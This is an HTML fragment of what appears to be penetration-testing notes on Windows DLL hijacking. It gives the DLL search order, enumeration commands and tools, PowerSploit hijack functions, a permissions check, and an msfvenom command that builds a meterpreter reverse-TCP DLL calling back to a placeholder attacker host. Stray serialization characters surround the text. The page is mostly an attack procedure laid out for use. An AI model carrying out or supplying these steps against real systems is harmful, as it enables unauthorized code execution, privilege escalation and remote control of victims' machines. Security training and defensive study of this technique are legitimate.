I"¥<h3>DLL Hijacking</h3>
<p><br />
Windows has a search path for DLLs in its underlying architecture. If you can figure out what DLLs an executable requests without an absolute path (triggering this search process), you can then place your hostile DLL somewhere higher up the search path so itâ€™ll be provided to the application before the real version.<br />
Search order:<br />
The directory from which the application loaded.<br />
The system directory. (C:\Windows\System32)<br />
The 16-bit System Directory. (C:\Windows\System)<br />
The Windows directory. (C:\Windows)<br />
The current directory.<br />
The directories that are listed in the PATH environment variable.<br /><br /></p>

<p>Enumeration:<br />
<code>&gt;wmic process &gt; outfile</code><br />
<code>&gt;tasklist /FO CSV &gt; tasks.txt</code><br /><br /></p>

<p>Enumeration tools:<br /><br />
<a href="https://github.com/MojtabaTajik/Robber">Robber</a><br />
Enumeration Tool<br /><br />
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a><br />
Find startup programs and show the file path the program runs from.<br /><br />
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Procmon</a><br />
Apply a basic filter with the following properties:<br />
Process Name is &lt;[Value]&gt;<br />
Result is &lt;[NAME NOT FOUND]&gt;<br />
Path ends with .dll* <br /><br /></p>

<p>Powersploit tool to enumerate and exploit:<br />
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/">Find-ProcessDLLHijack </a><br />
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Find-PathDLLHijack/">Find-PathDLLHijack </a><br />
<a href="https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/">Write-HijackDll </a><br /><br /></p>

<p>Now utilize the search order and check where is the original dll loaded from. in case it`s loaded from The windows directory then you can use the first 3 to inject your dll.<br /></p>

<p>Check Permissions:<br />
<code>&gt;icacls .</code><br /></p>

<p>Generate the dll file<br />
<code>&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8888 -f dll &gt; output.dll</code><br /><br /></p>

:ET